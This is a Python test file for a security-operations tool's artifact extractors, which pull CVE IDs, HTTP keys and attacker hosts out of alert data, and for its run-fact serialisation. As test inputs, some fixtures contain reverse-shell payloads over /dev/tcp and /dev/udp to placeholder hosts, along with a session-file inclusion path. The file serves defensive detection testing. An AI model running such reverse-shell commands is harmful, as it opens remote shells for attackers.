"""The artifact rules and the records of the campaign engine."""

from __future__ import annotations

from datetime import datetime

import pytest
from soc_ai.campaigns.artifacts import cve_ids, http_key, named_hosts, shell_hosts
from soc_ai.campaigns.types import DocFacts, RunFacts, jsonable, naive_utc


def test_cve_ids_reads_each_id_in_upper_case() -> None:
    found = cve_ids("ET EXPLOIT Thing (CVE-2026-109618)", "seen cve-2025-1234 here", None, "")
    assert found == frozenset({"CVE-2026-109618", "CVE-2025-1234"})


def test_cve_ids_needs_the_whole_form() -> None:
    assert cve_ids("CVE-2026-12", "XCVE-2026-10000", "CVE-26-10000") == frozenset()


@pytest.mark.parametrize(
    ("method", "uri", "expected"),
    [
        ("get", "/a/b.php?x=1#f", "GET /a/b.php"),
        ("POST", "/index.php", "POST /index.php"),
        ("GET", "http://web-1.example.test/a/b?x=1", "GET /a/b"),
        ("GET", "/", None),
        ("GET", "/?page=1", None),
        (None, "/a", None),
        ("GET", None, None),
        ("GET", "  ", None),
        ("GET", "a/b", None),
    ],
)
def test_http_key(method: str | None, uri: str | None, expected: str | None) -> None:
    assert http_key(method, uri) == expected


def test_named_hosts_reads_a_url_and_a_dev_tcp_path() -> None:
    found = named_hosts(
        "/x?u=http://files.example.test:8080/a", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
    )
    assert found == ("203.0.113.9", "files.example.test")


def test_named_hosts_reads_a_host_header() -> None:
    assert named_hosts("198.51.100.10:80") == ("198.51.100.10",)
    assert named_hosts("Web-1.Example.Test") == ("web-1.example.test",)


@pytest.mark.parametrize(
    "text", ["127.0.0.1", "0.0.0.0", "localhost", "1.2.3", "version 1.2.3.4.5", ""]
)
def test_named_hosts_drops_what_names_no_host(text: str) -> None:
    assert named_hosts(text) == ()


def test_named_hosts_reads_no_host_from_a_plain_path() -> None:
    assert named_hosts("/wp-content.php?page=/var/lib/php/sessions/sess_1&1=id") == ()


def test_naive_utc_folds_an_offset() -> None:
    assert naive_utc("2026-01-10T02:00:00+02:00") == datetime(2026, 1, 10, 0, 0, 0)
    assert naive_utc("2026-01-10T00:00:00Z") == datetime(2026, 1, 10, 0, 0, 0)
    assert naive_utc("no time") is None
    assert naive_utc(None) is None


def _full() -> RunFacts:
    at = datetime(2026, 1, 10, 1, 2, 3)
    return RunFacts(
        run_id="r1",
        kind="finding",
        verdict="true_positive",
        label="A finding",
        event_time=at,
        finished_at=datetime(2026, 1, 10, 1, 9, 0),
        source="agent:a1",
        target="ip:198.51.100.10",
        source_address="192.0.2.1",
        target_address="198.51.100.10",
        source_name="actor-a",
        target_name="web-1",
        source_join="agent",
        target_join="network",
        attack_class="finding",
        impact="succeeded",
        stage_claim="action",
        rules=frozenset({"RULE B", "RULE A"}),
        cves=frozenset({"CVE-2026-10000"}),
        http_keys=frozenset({"GET /a"}),
        sessions=(("1:abc=", at),),
        documents=(
            DocFacts(
                id="d1",
                at=at,
                community_id="1:abc=",
                source="agent:a1",
                target="ip:198.51.100.10",
                source_address="192.0.2.1",
                target_address="198.51.100.10",
                target_port=80,
                dataset="suricata.alert",
                is_alert=True,
                rule_key="RULE A",
                named=("files.example.test",),
                cited=True,
                label="RULE A",
            ),
        ),
        cited_ids=("d1",),
        cited_unresolved=0,
        tier="scheduled_hunt",
        hunt_id="h1",
    )


def test_run_facts_round_trip() -> None:
    facts = _full()
    stored = facts.to_json()
    assert stored["rules"] == ["RULE A", "RULE B"]
    assert stored["event_time"] == "2026-01-10T01:02:03"
    assert RunFacts.from_json(stored) == facts


def test_run_facts_round_trip_of_an_empty_run() -> None:
    facts = RunFacts(run_id="r0")
    assert RunFacts.from_json(facts.to_json()) == facts


def test_from_json_drops_what_is_no_fact() -> None:
    facts = RunFacts.from_json(
        {
            "run_id": "r1",
            "sessions": [["1:a", "bad"], "x", ["1:b", "2026-01-10T00:00:00"]],
            "documents": ["x", {"id": "d1", "target_port": True}],
            "cited_unresolved": "2",
        }
    )
    assert facts.sessions == (("1:b", datetime(2026, 1, 10)),)
    assert facts.documents == (DocFacts(id="d1"),)
    assert facts.cited_unresolved == 0


def test_a_document_of_the_first_facts_version_reads_with_an_empty_label() -> None:
    """Facts of version 1 hold no label. They read, and the next rebuild reads the run again."""
    facts = RunFacts.from_json({"run_id": "r1", "documents": [{"id": "d1", "is_alert": True}]})
    assert facts.documents[0].label == ""
    # NEGATIVE CONTROL: a label that is no text is no label.
    odd = RunFacts.from_json({"run_id": "r1", "documents": [{"id": "d1", "label": 7}]})
    assert odd.documents[0].label == ""


@pytest.mark.parametrize(
    ("over", "attack", "seed"),
    [
        ({}, True, True),
        ({"impact": "none"}, True, False),
        ({"attack_class": ""}, False, False),
        ({"attack_class": "", "impact": "attempted"}, True, True),
        ({"attack_class": "", "impact": "unknown"}, False, False),
        ({"verdict": "false_positive"}, False, False),
        ({"source": None}, True, False),
        ({"target": "agent:a1"}, True, False),
        ({"event_time": None}, True, False),
    ],
)
def test_attack_and_seed(over: dict[str, object], attack: bool, seed: bool) -> None:
    base: dict[str, object] = {
        "run_id": "r1",
        "event_time": datetime(2026, 1, 10),
        "source": "agent:a1",
        "target": "ip:198.51.100.10",
        "attack_class": "exploit_attempt",
    }
    facts = RunFacts(**{**base, **over})  # type: ignore[arg-type]
    assert facts.is_attack is attack
    assert facts.is_seed is seed


def test_jsonable_sorts_a_set_and_writes_a_time() -> None:
    assert jsonable({"a": frozenset({"b", "a"}), "t": (datetime(2026, 1, 10),)}) == {
        "a": ["a", "b"],
        "t": ["2026-01-10T00:00:00"],
    }


def test_shell_hosts_reads_only_the_dev_tcp_form() -> None:
    payload = (
        "GET /x HTTP/1.1\r\nUser-Agent: scanner (https://tool.example.test/book)\r\n\r\n"
        "cmd=bash -i >& /dev/tcp/203.0.113.9/4444 0>&1; exec 3<>/dev/udp/cb.example.test/53"
    )
    assert shell_hosts(payload, None) == ("203.0.113.9", "cb.example.test")
    assert shell_hosts("http://tool.example.test/a", "/dev/tcp/127.0.0.1/80") == ()
